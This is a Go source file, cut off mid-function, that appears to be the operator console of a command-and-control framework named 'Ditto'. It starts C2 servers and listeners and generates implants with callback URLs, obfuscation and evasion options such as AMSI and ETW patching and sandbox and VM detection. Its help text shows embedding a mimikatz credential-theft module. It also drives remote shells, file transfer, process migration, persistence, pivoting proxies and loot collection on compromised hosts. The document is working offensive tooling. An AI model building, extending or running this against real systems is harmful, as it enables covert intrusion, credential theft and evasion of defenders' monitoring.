package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/ditto/ditto/banner"
	"github.com/ditto/ditto/certificates"
	"github.com/ditto/ditto/core"
	"github.com/ditto/ditto/database"
	"github.com/ditto/ditto/jobs"
	"github.com/ditto/ditto/loot"
	"github.com/ditto/ditto/modules"
	"github.com/ditto/ditto/payload"
	"github.com/ditto/ditto/persistence"
	"github.com/ditto/ditto/pivoting"
	"github.com/ditto/ditto/reactions"
	"github.com/ditto/ditto/tasks"
	"github.com/ditto/ditto/transport"
	"github.com/jedib0t/go-pretty/v6/table"
)

// InteractiveServer manages the interactive server CLI
type InteractiveServer struct {
	logger         *core.Logger
	config         *core.Config
	server         *transport.Server
	serverRunning  bool
	serverMu       sync.RWMutex
	jobManager     *jobs.JobManager
	sessionMgr     *core.SessionManager
	moduleRegistry *modules.ModuleRegistry
	currentSession string
	lootManager    *loot.LootManager
	pivotManager   *pivoting.PortForwardManager
	socksManager   *pivoting.SOCKS5Manager
	persistManager *persistence.Installer
	reactionMgr    *reactions.ReactionManager
	taskQueue      *tasks.Queue // Shared task queue for all components
}

// NewInteractiveServer creates a new interactive server
func NewInteractiveServer(logger *core.Logger, cfg *core.Config) *InteractiveServer {
	moduleRegistry := modules.NewModuleRegistry(logger)
	
	// Create shared task queue for all components
	sharedTaskQueue := tasks.NewQueue(1000)
	
	is := &InteractiveServer{
		logger:         logger,
		config:         cfg,
		jobManager:     jobs.NewJobManager(),
		sessionMgr:     core.NewSessionManager(),
		moduleRegistry: moduleRegistry,
		lootManager:    loot.NewLootManager(logger),
		pivotManager:   pivoting.NewPortForwardManager(),
		socksManager:   pivoting.NewSOCKS5Manager(),
		persistManager: nil, // Created per-installation
		reactionMgr:    reactions.NewReactionManager(logger),
		taskQueue:      sharedTaskQueue,
	}
	
	// Restore listener jobs from database
	is.restoreListenerJobs()
	
	return is
}

func (is *InteractiveServer) restoreListenerJobs() {
	listenerJobs, err := database.GetListenerJobs()
	if err != nil {
		is.logger.Error("Failed to restore listener jobs: %v", err)
		return
	}
	
	for _, dbJob := range listenerJobs {
		if dbJob.Status == "running" {
			is.logger.Info("Found persistent listener job: %s (%s:%d)", dbJob.Type, dbJob.Host, dbJob.Port)
			// Note: We can't restore the actual listener without the StopFunc
			// This is logged for visibility but listener would need to be manually restarted
			// This matches Sliver's behavior - jobs are restored but listeners need manual restart
		}
	}
}

// Run starts the interactive server CLI
func (is *InteractiveServer) Run() {
	banner.PrintDittoBanner()
	fmt.Println("Ditto Interactive Server")
	fmt.Println("Type 'help' for available commands")
	fmt.Println()

	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("[ditto] > ")
		if !scanner.Scan() {
			break
		}

		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		parts := strings.Fields(line)
		if len(parts) == 0 {
			continue
		}

		command := parts[0]
		args := parts[1:]

		if err := is.handleCommand(command, args); err != nil {
			fmt.Printf("[!] Error: %v\n", err)
		}
	}
}

func (is *InteractiveServer) handleCommand(cmd string, args []string) error {
	switch cmd {
	case "help", "h", "?":
		is.printHelp()
	case "server", "srv", "s":
		return is.handleServer(args)
	case "stop-server", "stop":
		return is.handleStopServer()
	case "jobs", "j":
		is.printJobs()
	case "kill", "k":
		return is.handleKill(args)
	case "generate", "gen", "g":
		return is.handleGenerate(args)
	case "sessions", "sess":
		is.printSessions()
	case "use", "u":
		return is.handleUse(args)
	case "listen", "l":
		return is.handleListen(args)
	case "port-forward", "pf":
		return is.handlePortForward(args)
	case "socks5":
		return is.handleSOCKS5(args)
	case "loot":
		return is.handleLoot(args)
	case "persist":
		return is.handlePersistence(args)
	case "implants":
		return is.handleImplants(args)
	case "implant", "get-implant":
		return is.handleGetImplant(args)
	case "version", "v":
		fmt.Printf("Ditto v%s\nBuild: %s\nCommit: %s\n", version, buildTime, gitCommit)
	case "clear", "cls":
		fmt.Print("\033[H\033[2J")
		banner.PrintDittoBanner()
	case "exit", "quit", "q":
		if is.isServerRunning() {
			fmt.Println("[!] Server is running. Stop it first with 'stop-server'")
			return nil
		}
		fmt.Println("Exiting Ditto...")
		os.Exit(0)
	default:
		fmt.Printf("[!] Unknown command: %s\nType 'help' for available commands.\n", cmd)
	}
	return nil
}

func (is *InteractiveServer) printHelp() {
	help := `
Available Commands:
  Server Management:
    server, srv, s <addr>     Start C2 server (default: 0.0.0.0:8443)
    stop-server, stop          Stop the running server
    
  Jobs & Listeners:
    jobs, j                    List all active jobs/listeners
    listen, l <type> <addr>    Start a listener (http, https, mtls)
                               Example: listen http 0.0.0.0:8080
    kill, k <job_id>           Stop a job by ID
    
  Pivoting:
    port-forward, pf            Create port forward through session
                               Usage: port-forward <session_id> <local> <remote>
    socks5                      Start SOCKS5 proxy through session
                               Usage: socks5 <session_id> <bind_addr> [user] [pass]
    
  Loot Management:
    loot list                  List all loot items
    loot add <type> <name> <data>  Add loot item
    loot get <id>              Get loot item details
    loot remove <id>           Remove loot item
    loot export                Export all loot as JSON
    
  Persistence:
    persist install <session>  Install persistence on session
    persist remove <session>   Remove persistence from session
    
  Implants:
    implants                   List all saved implant builds
    implant <id>                Get implant build details by ID
    
         Implant Generation:
           generate, gen, g           Generate implant
                                      Usage: generate <type> <os> <arch> [options]
                                      Options:
                                        --callback, -c <url>     Callback URL (http://host:port)
                                        --delay, -d <sec>        Beacon delay (default: 30)
                                        --jitter, -j <0.0-1.0>   Jitter percentage
                                        --output, -o <path>      Output file path
                                      Example: generate full windows amd64 --callback http://192.168.1.100:8443
                               
  Session Management:
    sessions, sess             List all active sessions
    use, u <session_id>       Interact with a session
    
  Utilities:
    version, v                 Show version information
    clear, cls                 Clear screen
    exit, quit, q              Exit Ditto
`
	fmt.Println(help)
}

func (is *InteractiveServer) handleServer(args []string) error {
	if is.isServerRunning() {
		fmt.Println("[!] Server is already running")
		return nil
	}

	listenAddr := "0.0.0.0:8443"
	if len(args) > 0 {
		listenAddr = args[0]
	}

	// Validate address format
	if err := validateAddress(listenAddr); err != nil {
		return fmt.Errorf("invalid server address '%s': %w\n"+
			"  Expected format: <host>:<port>\n"+
			"  Examples: 0.0.0.0:8443, 127.0.0.1:8080, localhost:443\n"+
			"  Note: Port must be between 1 and 65535", listenAddr, err)
	}

	fmt.Printf("[*] Starting C2 server on %s...\n", listenAddr)

	is.server = transport.NewServerWithTaskQueue(is.config, is.logger, is.taskQueue)
	
	// Channel to track server startup errors
	startupErr := make(chan error, 1)
	
	// Start server in background
	go func() {
		is.setServerRunning(true)
		if err := is.server.Start(listenAddr); err != nil {
			is.setServerRunning(false)
			startupErr <- err
			return
		}
		// Server stopped normally
		is.setServerRunning(false)
		startupErr <- nil
	}()
	
	// Sync server sessions periodically
	go is.syncSessions()

	// Give server time to start and check for immediate errors
	select {
	case err := <-startupErr:
		if err != nil {
			is.setServerRunning(false)
			return fmt.Errorf("server failed to start: %w", err)
		}
		// Server stopped before we could check (shouldn't happen)
		return fmt.Errorf("server stopped unexpectedly")
	case <-time.After(500 * time.Millisecond):
		// Server appears to be running (no immediate error)
		if !is.isServerRunning() {
			return fmt.Errorf("server failed to start")
		}
		fmt.Printf("[+] Server started successfully on %s\n", listenAddr)
		fmt.Println("[*] Press Ctrl+C or use 'stop-server' to stop")
		return nil
	}
}

func (is *InteractiveServer) handleStopServer() error {
	if !is.isServerRunning() {
		fmt.Println("[!] Server is not running")
		return nil
	}

	fmt.Println("[*] Stopping server...")
	
	// Stop the server
	if is.server != nil {
		if err := is.server.Stop(); err != nil {
			is.logger.Error("Error stopping server: %v", err)
		}
	}
	
	is.setServerRunning(false)
	
	// Stop all listeners
	for _, job := range is.jobManager.ListJobs() {
		if job.Type == jobs.JobTypeListener {
			is.jobManager.StopJob(job.ID)
		}
	}
	
	fmt.Println("[+] Server stopped")
	return nil
}

func (is *InteractiveServer) handleListen(args []string) error {
	if len(args) < 2 {
		fmt.Println("[!] Usage: listen <type> <addr>")
		fmt.Println("    Types: http, https, mtls")
		fmt.Println("    Example: listen http 0.0.0.0:8080")
		return nil
	}

	listenerType := strings.ToLower(args[0])
	addr := args[1]

	// Validate listener type
	validTypes := map[string]bool{"http": true, "https": true, "mtls": true}
	if !validTypes[listenerType] {
		return fmt.Errorf("invalid listener type '%s'\n"+
			"  Valid types: http, https, mtls\n"+
			"  Usage: listen <type> <address>\n"+
			"  Examples:\n"+
			"    listen http 0.0.0.0:8080\n"+
			"    listen https 0.0.0.0:8443\n"+
			"    listen mtls 0.0.0.0:9090", listenerType)
	}

	// Validate address format
	if err := validateAddress(addr); err != nil {
		return fmt.Errorf("invalid listener address '%s': %w\n"+
			"  Expected format: <host>:<port>\n"+
			"  Examples: 0.0.0.0:8080, 127.0.0.1:8443\n"+
			"  Note: Port must be between 1 and 65535", addr, err)
	}

	// Ensure server is running
	if !is.isServerRunning() {
		return fmt.Errorf("server is not running - you must start the C2 server first\n"+
			"  Usage: server [<address>]\n"+
			"  Example: server 0.0.0.0:8443\n"+
			"  Note: The server must be running before you can start listeners")
	}

	jobName := fmt.Sprintf("%s listener on %s", listenerType, addr)
	
	var stopFunc func() error
	
	switch listenerType {
	case "http":
		stopFunc = is.startHTTPListener(addr, jobName)
	case "https":
		stopFunc = is.startHTTPSListener(addr, jobName)
	case "mtls":
		stopFunc = is.startMTLSListener(addr, jobName)
	default:
		return fmt.Errorf("unknown listener type: %s", listenerType)
	}

	if stopFunc == nil {
		return fmt.Errorf("failed to start %s listener on %s\n"+
			"  Possible causes:\n"+
			"    - Port already in use\n"+
			"    - Insufficient permissions\n"+
			"    - Certificate issues (for https/mtls)\n"+
			"  Check server logs for details", listenerType, addr)
	}

	job := is.jobManager.AddJob(jobs.JobTypeListener, jobName, stopFunc)
	job.Metadata["type"] = listenerType
	job.Metadata["addr"] = addr
	
	// Persist listener job to database
	if err := is.saveListenerJobToDB(job, listenerType, addr); err != nil {
		is.logger.Error("Failed to save listener job to database: %v", err)
		// Continue anyway - job is still active
	}

	fmt.Printf("[+] Started %s (Job ID: %d)\n", jobName, job.ID)
	return nil
}

func (is *InteractiveServer) saveListenerJobToDB(job *jobs.Job, listenerType, addr string) error {
	// Parse address
	host, portStr := "", uint32(0)
	if parts := strings.Split(addr, ":"); len(parts) == 2 {
		host = parts[0]
		if p, err := strconv.ParseUint(parts[1], 10, 32); err == nil {
			portStr = uint32(p)
		}
	}
	
	listenerJob := &database.ListenerJob{
		JobID:    uint64(job.ID),
		Type:     listenerType,
		Host:     host,
		Port:     portStr,
		Secure:   listenerType == "https" || listenerType == "mtls",
		CertPath: is.config.Server.TLSCertPath,
		KeyPath:  is.config.Server.TLSKeyPath,
		Status:   "running",
	}
	
	return database.SaveListenerJob(listenerJob)
}

func (is *InteractiveServer) startHTTPListener(addr, jobName string) func() error {
	httpTransport := transport.NewHTTPTransportWithTaskQueue(is.config, is.logger, is.taskQueue)
	
	httpTransportConfig := &transport.TransportConfig{
		BindAddr:     addr,
		TLSEnabled:   false,
		ReadTimeout:  is.config.Server.ReadTimeout,
		WriteTimeout: is.config.Server.WriteTimeout,
	}
	
	ctx := context.Background()
	if err := httpTransport.Start(ctx, httpTransportConfig); err != nil {
		is.logger.Error("Failed to start HTTP listener: %v", err)
		return nil
	}
	
	return func() error {
		is.logger.Info("Stopping HTTP listener: %s", jobName)
		return httpTransport.Stop()
	}
}

func (is *InteractiveServer) startHTTPSListener(addr, jobName string) func() error {
	// Ensure certificates exist, generate if needed
	certPath := is.config.Server.TLSCertPath
	keyPath := is.config.Server.TLSKeyPath
	
	if certPath == "" || keyPath == "" {
		// Generate default paths
		certPath = "./certs/server.crt"
		keyPath = "./certs/server.key"
		is.config.Server.TLSCertPath = certPath
		is.config.Server.TLSKeyPath = keyPath
	}
	
	// Check if certificates exist
	if _, err := os.Stat(certPath); os.IsNotExist(err) {
		is.logger.Info("Certificates not found, generating...")
		cm := certificates.NewCAManager(is.logger)
		
		// Generate CA first
		if err := cm.GenerateCA("Ditto CA"); err != nil {
			is.logger.Error("Failed to generate CA: %v", err)
			return nil
		}
		
		// Generate server certificate
		certPEM, keyPEM, err := cm.GenerateCertificate("localhost", []string{"localhost", "127.0.0.1"}, nil)
		if err != nil {
			is.logger.Error("Failed to generate certificate: %v", err)
			return nil
		}
		
		// Ensure cert directory exists
		certDir := filepath.Dir(certPath)
		if err := os.MkdirAll(certDir, 0755); err != nil {
			is.logger.Error("Failed to create cert directory: %v", err)
			return nil
		}
		
		// Write certificates
		if err := os.WriteFile(certPath, certPEM, 0644); err != nil {
			is.logger.Error("Failed to write certificate: %v", err)
			return nil
		}
		if err := os.WriteFile(keyPath, keyPEM, 0600); err != nil {
			is.logger.Error("Failed to write key: %v", err)
			return nil
		}
		
		is.logger.Info("Certificates generated successfully")
	}
	
	httpTransport := transport.NewHTTPTransportWithTaskQueue(is.config, is.logger, is.taskQueue)

	httpTransportConfig := &transport.TransportConfig{
		BindAddr:     addr,
		TLSEnabled:   true,
		TLSCertPath:  certPath,
		TLSKeyPath:   keyPath,
		ReadTimeout:  is.config.Server.ReadTimeout,
		WriteTimeout: is.config.Server.WriteTimeout,
	}
	
	ctx := context.Background()
	if err := httpTransport.Start(ctx, httpTransportConfig); err != nil {
		is.logger.Error("Failed to start HTTPS listener: %v", err)
		return nil
	}
	
	return func() error {
		is.logger.Info("Stopping HTTPS listener: %s", jobName)
		return httpTransport.Stop()
	}
}

func (is *InteractiveServer) startMTLSListener(addr, jobName string) func() error {
	// Ensure certificates exist, generate if needed
	certPath := is.config.Server.TLSCertPath
	keyPath := is.config.Server.TLSKeyPath
	
	if certPath == "" || keyPath == "" {
		// Generate default paths
		certPath = "./certs/server.crt"
		keyPath = "./certs/server.key"
		is.config.Server.TLSCertPath = certPath
		is.config.Server.TLSKeyPath = keyPath
	}
	
	// Check if certificates exist
	if _, err := os.Stat(certPath); os.IsNotExist(err) {
		is.logger.Info("Certificates not found, generating...")
		cm := certificates.NewCAManager(is.logger)
		
		// Generate CA first
		if err := cm.GenerateCA("Ditto CA"); err != nil {
			is.logger.Error("Failed to generate CA: %v", err)
			return nil
		}
		
		// Generate server certificate
		certPEM, keyPEM, err := cm.GenerateCertificate("localhost", []string{"localhost", "127.0.0.1"}, nil)
		if err != nil {
			is.logger.Error("Failed to generate certificate: %v", err)
			return nil
		}
		
		// Ensure cert directory exists
		certDir := filepath.Dir(certPath)
		if err := os.MkdirAll(certDir, 0755); err != nil {
			is.logger.Error("Failed to create cert directory: %v", err)
			return nil
		}
		
		// Write certificates
		if err := os.WriteFile(certPath, certPEM, 0644); err != nil {
			is.logger.Error("Failed to write certificate: %v", err)
			return nil
		}
		if err := os.WriteFile(keyPath, keyPEM, 0600); err != nil {
			is.logger.Error("Failed to write key: %v", err)
			return nil
		}
		
		is.logger.Info("Certificates generated successfully")
	}
	
	mtlsTransport := transport.NewmTLSTransportWithTaskQueue(is.config, is.logger, is.taskQueue)
	
	mtlsTransportConfig := &transport.TransportConfig{
		BindAddr:     addr,
		TLSEnabled:   true,
		TLSCertPath:  certPath,
		TLSKeyPath:   keyPath,
		ReadTimeout:  is.config.Server.ReadTimeout,
		WriteTimeout: is.config.Server.WriteTimeout,
	}
	
	ctx := context.Background()
	if err := mtlsTransport.Start(ctx, mtlsTransportConfig); err != nil {
		is.logger.Error("Failed to start mTLS listener: %v", err)
		return nil
	}
	
	return func() error {
		is.logger.Info("Stopping mTLS listener: %s", jobName)
		return mtlsTransport.Stop()
	}
}

func (is *InteractiveServer) handleKill(args []string) error {
	if len(args) == 0 {
		fmt.Println("[!] Usage: kill <job_id>")
		fmt.Println("    Use 'jobs' to list job IDs")
		return nil
	}

	jobID, err := strconv.ParseUint(args[0], 10, 64)
	if err != nil {
		return fmt.Errorf("invalid job ID '%s': must be a number\n"+
			"  Usage: kill <job_id>\n"+
			"  Use 'jobs' command to list all active jobs with their IDs", args[0])
	}

	if err := is.jobManager.StopJob(jobID); err != nil {
		return fmt.Errorf("failed to stop job: %w", err)
	}
	
	// Remove from database
	if err := database.DeleteJob(jobID); err != nil {
		is.logger.Error("Failed to delete job from database: %v", err)
		// Continue anyway
	}

	fmt.Printf("[+] Stopped job %d\n", jobID)
	return nil
}

func (is *InteractiveServer) handleGenerate(args []string) error {
	if len(args) < 3 {
		fmt.Println("[!] Usage: generate <type> <os> <arch> [options]")
		fmt.Println("    Types: stager, shellcode, full")
		fmt.Println("    OS: linux, windows, darwin")
		fmt.Println("    Arch: amd64, 386, arm64")
		fmt.Println("")
		fmt.Println("    Options:")
		fmt.Println("      --output, -o <path>      Output file path")
		fmt.Println("      --callback, -c <url>     Callback URL (http://host:port or https://host:port)")
		fmt.Println("      --delay, -d <seconds>    Beacon delay in seconds (default: 30)")
		fmt.Println("      --jitter, -j <0.0-1.0>   Jitter percentage (default: 0.0)")
		fmt.Println("      --user-agent, -u <ua>    Custom user agent string")
		fmt.Println("      --protocol, -p <proto>   Protocol: http, https, mtls (default: http)")
		fmt.Println("      --no-encrypt            Disable encryption")
		fmt.Println("      --no-obfuscate          Disable obfuscation")
		fmt.Println("      --modules, -m <ids>      Comma-separated Empire module IDs to embed")
		fmt.Println("      --evasion <options>      Evasion features (comma-separated)")
		fmt.Println("                               Options: sandbox,debugger,vm,etw,amsi,sleepmask,syscalls")
		fmt.Println("")
		fmt.Println("    Examples:")
		fmt.Println("      generate full windows amd64 --callback http://192.168.1.100:8443")
		fmt.Println("      generate stager windows amd64 -o /tmp/implant.exe -c https://example.com:443")
		fmt.Println("      generate full windows amd64 --callback 192.168.1.100:8443 --delay 60 --jitter 0.3")
		fmt.Println("      generate full windows amd64 -c http://192.168.1.100:8443 --modules powershell/credentials/mimikatz")
		fmt.Println("      generate full windows amd64 -c http://192.168.1.100:8443 --evasion sandbox,debugger,vm")
		return nil
	}

	payloadType := args[0]
	osTarget := args[1]
	arch := args[2]
	
	// Parse flags
	var outputPath string
	var callbackURL string
	var delay int
	var jitter float64
	var userAgent string
	var protocol string
	var modulesStr string
	var evasionStr string
	encrypt := true
	obfuscate := true
	
	for i := 3; i < len(args); i++ {
		switch args[i] {
		case "--output", "-o":
			if i+1 < len(args) {
				outputPath = args[i+1]
				i++
			}
		case "--callback", "-c":
			if i+1 < len(args) {
				callbackURL = args[i+1]
				// Validate callback URL format
				if err := validateCallbackURL(callbackURL); err != nil {
					return fmt.Errorf("invalid callback URL '%s': %w\n"+
						"  Expected format: <protocol>://<host>[:<port>]\n"+
						"  Valid protocols: http, https\n"+
						"  Examples:\n"+
						"    http://192.168.1.100:8443\n"+
						"    https://example.com:443\n"+
						"    http://c2.example.com\n"+
						"  Note: Port must be between 1 and 65535 if specified", callbackURL, err)
				}
				i++
			}
		case "--delay", "-d":
			if i+1 < len(args) {
				fmt.Sscanf(args[i+1], "%d", &delay)
				i++
			}
		case "--jitter", "-j":
			if i+1 < len(args) {
				fmt.Sscanf(args[i+1], "%f", &jitter)
				i++
			}
		case "--user-agent", "-u":
			if i+1 < len(args) {
				userAgent = args[i+1]
				i++
			}
		case "--protocol", "-p":
			if i+1 < len(args) {
				protocol = args[i+1]
				i++
			}
		case "--modules", "-m":
			if i+1 < len(args) {
				modulesStr = args[i+1]
				i++
			}
		case "--evasion":
			if i+1 < len(args) {
				evasionStr = args[i+1]
				i++
			}
		case "--no-encrypt":
			encrypt = false
		case "--no-obfuscate":
			obfuscate = false
		}
	}
	
	// Parse modules
	var modules []string
	if modulesStr != "" {
		modules = strings.Split(modulesStr, ",")
		// Trim whitespace
		for i, m := range modules {
			modules[i] = strings.TrimSpace(m)
		}
	}
	
	// Parse evasion options
	var evasion *payload.EvasionConfig
	if evasionStr != "" {
		evasion = &payload.EvasionConfig{}
		evasionOptions := strings.Split(evasionStr, ",")
		for _, opt := range evasionOptions {
			switch strings.TrimSpace(strings.ToLower(opt)) {
			case "sandbox":
				evasion.EnableSandboxDetection = true
			case "debugger":
				evasion.EnableDebuggerCheck = true
			case "vm":
				evasion.EnableVMDetection = true
			case "etw":
				evasion.EnableETWPatches = true
			case "amsi":
				evasion.EnableAMSI = true
			case "sleepmask":
				evasion.SleepMask = true
			case "syscalls":
				evasion.DirectSyscalls = true
			}
		}
	}
	
	// Set default output path if not provided
	if outputPath == "" {
		outputDir := "./implants"
		os.MkdirAll(outputDir, 0755)
		
		ext := ".bin"
		if osTarget == "windows" {
			ext = ".exe"
		}
		
		outputPath = filepath.Join(outputDir, fmt.Sprintf("implant_%s_%s_%s_%d%s",
			payloadType, osTarget, arch, time.Now().Unix(), ext))
	}

	fmt.Printf("[*] Generating %s payload for %s/%s...\n", payloadType, osTarget, arch)
	if callbackURL != "" {
		fmt.Printf("[*] Callback URL: %s\n", callbackURL)
	}
	if delay > 0 {
		fmt.Printf("[*] Delay: %d seconds\n", delay)
	}
	if jitter > 0 {
		fmt.Printf("[*] Jitter: %.1f%%\n", jitter*100)
	}
	fmt.Printf("[*] Output: %s\n", outputPath)

	options := payload.Options{
		Type:        payloadType,
		Arch:        arch,
		OS:          osTarget,
		Encrypt:     encrypt,
		Obfuscate:   obfuscate,
		Config:      is.config,
		CallbackURL: callbackURL,
		Delay:       delay,
		Jitter:      jitter,
		UserAgent:   userAgent,
		Protocol:    protocol,
		Modules:     modules,
		Evasion:     evasion,
	}

	gen := payload.NewGenerator(is.logger, is.moduleRegistry)
	data, err := gen.Generate(options)
	if err != nil {
		return fmt.Errorf("generation failed: %w", err)
	}

	// Ensure output directory exists
	outputDir := filepath.Dir(outputPath)
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		return fmt.Errorf("failed to create output directory: %w", err)
	}

	if err := os.WriteFile(outputPath, data, 0755); err != nil {
		return fmt.Errorf("failed to write payload: %w", err)
	}

	// Save build to database
	modulesJSON, _ := json.Marshal(options.Modules)
	evasionJSON, _ := json.Marshal(options.Evasion)
	
	build := &database.ImplantBuild{
		Name:        filepath.Base(outputPath),
		Type:        payloadType,
		OS:          osTarget,
		Arch:        arch,
		CallbackURL: callbackURL,
		Delay:       delay,
		Jitter:      jitter,
		UserAgent:   userAgent,
		Protocol:    protocol,
		OutputPath:  outputPath,
		Size:        int64(len(data)),
		Modules:     string(modulesJSON),
		Evasion:     string(evasionJSON),
	}
	
	if err := database.SaveImplantBuild(build); err != nil {
		is.logger.Error("Failed to save build to database: %v", err)
		// Continue anyway - build succeeded
	}

	fmt.Printf("[+] Payload generated successfully!\n")
	fmt.Printf("[+] Size: %d bytes\n", len(data))
	fmt.Printf("[+] Saved to: %s\n", outputPath)
	
	return nil
}

func (is *InteractiveServer) printJobs() {
	jobList := is.jobManager.ListJobs()
	
	if len(jobList) == 0 {
		fmt.Println("[*] No active jobs")
		return
	}

	t := table.NewWriter()
	t.SetStyle(table.StyleColoredBright)
	t.AppendHeader(table.Row{"ID", "Type", "Name", "Status", "Created"})

	for _, job := range jobList {
		t.AppendRow(table.Row{
			job.ID,
			job.Type,
			job.Name,
			job.Status,
			job.CreatedAt.Format("2006-01-02 15:04:05"),
		})
	}

	fmt.Println(t.Render())
}

func (is *InteractiveServer) printSessions() {
	sessionList := is.sessionMgr.ListSessions()
	
	if len(sessionList) == 0 {
		fmt.Println("[*] No active sessions")
		return
	}

	t := table.NewWriter()
	t.SetStyle(table.StyleColoredBright)
	t.AppendHeader(table.Row{"ID", "Type", "Transport", "Remote Addr", "Connected", "Last Seen", "State"})

	for _, session := range sessionList {
		t.AppendRow(table.Row{
			shortID(session.ID),
			session.Type,
			session.Transport,
			session.RemoteAddr,
			session.ConnectedAt.Format("15:04:05"),
			session.LastSeen.Format("15:04:05"),
			session.GetState(),
		})
	}

	fmt.Println(t.Render())
}

func (is *InteractiveServer) handleUse(args []string) error {
	if len(args) == 0 {
		if is.currentSession != "" {
			fmt.Printf("[*] Currently using session: %s\n", shortID(is.currentSession))
			fmt.Println("[*] Type 'back' to exit session")
			return nil
		}
		fmt.Println("[!] Usage: use <session_id>")
		fmt.Println("    Use 'sessions' to list session IDs")
		return nil
	}

	if args[0] == "back" {
		if is.currentSession != "" {
			fmt.Printf("[*] Exited session %s\n", shortID(is.currentSession))
			is.currentSession = ""
		} else {
			fmt.Println("[*] Not in a session")
		}
		return nil
	}

	sessionID := args[0]
	session, ok := is.sessionMgr.GetSession(sessionID)
	if !ok {
		return fmt.Errorf("session not found: %s", sessionID)
	}

	is.currentSession = sessionID
	fmt.Printf("[+] Using session %s\n", shortID(sessionID))
	fmt.Printf("    Type: %s\n", session.Type)
	fmt.Printf("    Transport: %s\n", session.Transport)
	fmt.Printf("    Remote: %s\n", session.RemoteAddr)
	fmt.Println("[*] Type commands to execute on session")
	fmt.Println("[*] Type 'back' to exit session")
	fmt.Println()
	
	// Enter interactive shell for session
	return is.sessionShell(sessionID)
}

func (is *InteractiveServer) sessionShell(sessionID string) error {
	if !is.isServerRunning() || is.server == nil {
		return fmt.Errorf("server not running")
	}
	
	scanner := bufio.NewScanner(os.Stdin)
	for {
		if is.currentSession != sessionID {
			break // Session changed
		}
		
		fmt.Print("[ditto " + shortID(sessionID) + "] > ")
		if !scanner.Scan() {
			break
		}
		
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		
		if line == "back" || line == "exit" {
			is.currentSession = ""
			break
		}
		
		parts := strings.Fields(line)
		if len(parts) == 0 {
			continue
		}
		
		command := parts[0]
		args := parts[1:]
		
		switch command {
		case "shell", "exec":
			is.executeShellCommand(sessionID, strings.Join(args, " "))
		case "module", "run":
			if len(args) >= 1 {
				is.executeModule(sessionID, args[0], args[1:])
			} else {
				fmt.Println("[!] Usage: module <module_id> [args...]")
			}
		case "download":
			if len(args) >= 1 {
				is.downloadFile(sessionID, args[0])
			} else {
				fmt.Println("[!] Usage: download <remote_path>")
			}
		case "upload":
			if len(args) >= 2 {
				is.uploadFile(sessionID, args[0], args[1])
			} else {
				fmt.Println("[!] Usage: upload <local_path> <remote_path>")
			}
		case "migrate":
			if len(args) >= 1 {
				if pid, err := strconv.Atoi(args[0]); err == nil {
					is.migrateProcess(sessionID, pid)
				} else {
					fmt.Println("[!] Usage: migrate <pid>")
				}
			} else {
				fmt.Println("[!] Usage: migrate <pid>")
			}
		case "cat":
			if len(args) >= 1 {
				is.executeFilesystemOp(sessionID, "cat", args[0])
			} else {
				fmt.Println("[!] Usage: cat <path>")
			}
		case "head":
			if len(args) >= 1 {
				lines := 10
				if len(args) >= 2 {
					if n, err := strconv.Atoi(args[1]); err == nil {
						lines = n
					}
				}
				is.executeFilesystemOp(sessionID, "head", args[0], fmt.Sprintf("%d", lines))
			} else {
				fmt.Println("[!] Usage: head <path> [lines]")
			}
		case "tail":
			if len(args) >= 1 {
				lines := 10
				if len(args) >= 2 {
					if n, err := strconv.Atoi(args[1]); err == nil {
						lines = n
					}
				}
				is.executeFilesystemOp(sessionID, "tail", args[0], fmt.Sprintf("%d", lines))
			} else {
				fmt.Println("[!] Usage: tail <path> [lines]")
			}
		case "grep":
			if len(args) >= 2 {
				is.executeFilesystemOp(sessionID, "grep", args[1], args[0])
			} else {
				fmt.Println("[!] Usage: grep <pattern> <path>")
			}
		case "help", "h":
			fmt.Println("Session commands:")
			fmt.Println("  shell <command>  - Execute shell command")
			fmt.Println("  module <id>      - Execute module")
			fmt.Println("  migrate <pid>   - Migrate to another process")
			fmt.Println("  grep <pattern> <path> - Search file contents")
			fmt.Println("  head <path>      - Show first lines of file")
			fmt.Println("  tail <path>      - Show last lines of file")
			fmt.Println("  cat <path>       - Display file contents")
			fmt.Println("  download <path> - Download file")
			fmt.Println("  upload <local> <remote> - Upload file")
			fmt.Println("  back, exit       - Exit session")
		default:
			// Default to shell command
			is.executeShellCommand(sessionID, line)
		}
	}
	
	return nil
}

func (is *InteractiveServer) executeShellCommand(sessionID, command string) {
	if is.server == nil {
		fmt.Println("[!] Server not initialized")
		return
	}
	
	// Queue task for session
	task := &tasks.Task{
		ID:   fmt.Sprintf("task-%d", time.Now().UnixNano()),
		Type: "shell",
		Command: command,
		Parameters: map[string]interface{}{
			"session_id": sessionID,
		},
	}
	is.server.EnqueueTask(task)
	fmt.Printf("[+] Queued command: %s\n", command)
}

func (is *InteractiveServer) executeModule(sessionID, moduleID string, args []string) {
	if is.server == nil {
		fmt.Println("[!] Server not initialized")
		return
	}
	
	module, ok := is.moduleRegistry.GetModule(moduleID)
	if !ok {
		fmt.Printf("[!] Module not found: %s\n", moduleID)
		return
	}
	
	// Validate module exists (we already checked above)
	_ = module
	params := make(map[string]interface{})
	params["session_id"] = sessionID
	for i := 0; i < len(args); i += 2 {
		if i+1 < len(args) {
			params[args[i]] = args[i+1]
		} else {
			// Single argument without value
			params[args[i]] = ""
		}
	}
	
	// Queue module task
	task := &tasks.Task{
		ID:   fmt.Sprintf("task-%d", time.Now().UnixNano()),
		Type: "module",
		Command: moduleID,
		Parameters: params,
	}
	is.server.EnqueueTask(task)
	fmt.Printf("[+] Queued module: %s (session: %s)\n", moduleID, shortID(sessionID))
}

func (is *InteractiveServer) downloadFile(sessionID, remotePath string) {
	if is.server == nil {
		fmt.Println("[!] Server not initialized")
		return
	}
	
	task := &tasks.Task{
		ID:   fmt.Sprintf("task-%d", time.Now().UnixNano()),
		Type: "download",
		Command: remotePath,
		Parameters: map[string]interface{}{
			"session_id": sessionID,
		},
	}
	is.server.EnqueueTask(task)
	fmt.Printf("[+] Queued download: %s\n", remotePath)
}

func (is *InteractiveServer) uploadFile(sessionID, localPath, remotePath string) {
	if is.server == nil {
		fmt.Println("[!] Server not initialized")
		return
	}
	
	data, err := os.ReadFile(localPath)
	if err != nil {
		fmt.Printf("[!] Failed to read file: %v\n", err)
		return
	}
	
	task := &tasks.Task{
